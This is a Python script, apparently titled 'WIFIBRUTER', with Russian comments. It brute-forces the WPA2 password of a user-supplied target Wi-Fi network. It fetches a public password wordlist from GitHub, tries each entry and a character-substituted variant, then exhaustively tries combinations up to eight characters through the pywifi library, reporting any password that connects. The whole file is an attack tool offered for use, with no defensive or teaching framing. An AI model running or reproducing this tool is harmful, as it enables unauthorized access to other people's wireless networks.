import itertools
import os
import requests
import random
import string
from pywifi import PyWiFi, const, Profile
import time
from colorama import init, Back, Fore, Style

# logo paste
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def gradient_text(text, start_color, end_color):
    # функция для преобразования цвета HEX в RGB
    def hex_to_rgb(hex_color):
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    # преобразуем цвета из HEX в RGB
    start_rgb = hex_to_rgb(start_color)
    end_rgb = hex_to_rgb(end_color)

    # функция для вычисления промежуточных цветов
    def interpolate_color(start_rgb, end_rgb, factor):
        return tuple(int(start_rgb[i] + (end_rgb[i] - start_rgb[i]) * factor) for i in range(3))

    # длина текста
    length = len(text)

    # создаем градиентный текст
    gradient_text = ''
    for i, char in enumerate(text):
        factor = i / (length - 1)  # используем length - 1 для плавного градиента
        color = interpolate_color(start_rgb, end_rgb, factor)
        gradient_text += f'[38;2;{color[0]};{color[1]};{color[2]}m{char}'
    gradient_text += '[0m'  # сбрасываем цвет

    return gradient_text

# цвета
start_color = "#ff7e93"
end_color = "#a200fa"

text = """

 █     █░ ██▓  █████▒██▓    ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████  ██▀███  
▓█░ █ ░█░▓██▒▓██   ▒▓██▒   ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▒██▒▒████ ░▒██▒   ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ░██░░▓█▒  ░░██░   ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ░██░░▒█░   ░██░   ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ░▓   ▒ ░   ░▓     ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░   ▒ ░ ░      ▒ ░   ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░
  ░   ░   ▒ ░ ░ ░    ▒ ░    ░    ░   ░░   ░  ░░░ ░ ░   ░         ░     ░░   ░ 
    ░     ░          ░      ░         ░        ░                 ░  ░   ░     
                                 ░                                            

"""

def load_passwords(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.text.splitlines()

def mutate_password(password):
    mutations = [
        (lambda s: s.replace('a', '@').replace('a', '4')),
        (lambda s: s.replace('e', '3').replace('E', '3')),
        (lambda s: s.replace('i', '1').replace('I', '1')),
        (lambda s: s.replace('o', '0').replace('O', '0')),
        (lambda s: s.upper()),
        (lambda s: s.lower())
    ]
    random.shuffle(mutations)
    for mutate in mutations:
        password = mutate(password)
    return password

def generate_combinations(length):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_+="
    for password in itertools.product(chars, repeat=length):
        yield ''.join(password)

def brute_force(ssid, password_list_url):
    passwords = load_passwords(password_list_url)

    for password in passwords:
        if try_password(ssid, password):
            return password
        mutated_password = mutate_password(password)
        if try_password(ssid, mutated_password):
            return mutated_password

    for length in range(1, 9):  # пробуйте комбинации длиной до 8 символов
        for password in generate_combinations(length):
            if try_password(ssid, password):
                return password

    return None


# заменяй когда надо!
def try_password(ssid, password):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    temp_profile = iface.add_network_profile(profile)

    print(f"{Fore. YELLOW}Bruting: '{password}' in SSID '{ssid}'...")

    iface.connect(temp_profile)
    time.sleep(10)  # увеличено время ожидания подключения

    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        time.sleep(5)  # добавлено время ожидания между попытками
        return True
    else:
        iface.disconnect()
        time.sleep(10)  # добавлено время ожидания между попытками
        return False


def main():
    clear_console()
    print(gradient_text(text, start_color, end_color))
    ssid = input(f"{Fore. WHITE}Target SSID: ")
    password_list_url = 'https://raw.githubusercontent.com/zecopro/wpa-passwords/refs/heads/master/3wifi-wordlist.txt'
    password = brute_force(ssid, password_list_url)

    if password:
        print(f"{Fore. GREEN}{ssid}: Password Bruted!: {password}")
    else:
        print(f"{Fore. RED}Password too hard to bruteforce, can't hack {ssid}")

if __name__ == "__main__":
    main()
